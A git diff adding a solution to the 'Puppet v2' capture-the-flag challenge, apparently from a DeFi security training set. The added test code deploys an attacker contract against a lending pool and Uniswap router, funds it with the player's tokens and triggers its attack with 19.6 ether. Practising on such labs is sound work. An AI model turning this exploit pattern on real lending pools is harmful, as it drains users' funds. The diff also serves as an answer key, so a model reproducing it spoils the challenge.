@@ -83,6 +83,14 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        attacker = await (await ethers.getContractFactory("PuppetV2PoolAttacker", player)).deploy(
+            lendingPool.address,
+            uniswapRouter.address,
+            token.address,
+            weth.address
+        )
+        token.connect(player).transfer(attacker.address, await token.balanceOf(player.address));
+        await attacker.connect(player).attack({value: ethers.utils.parseEther("19.6")});
     });
 
     after(async function () {
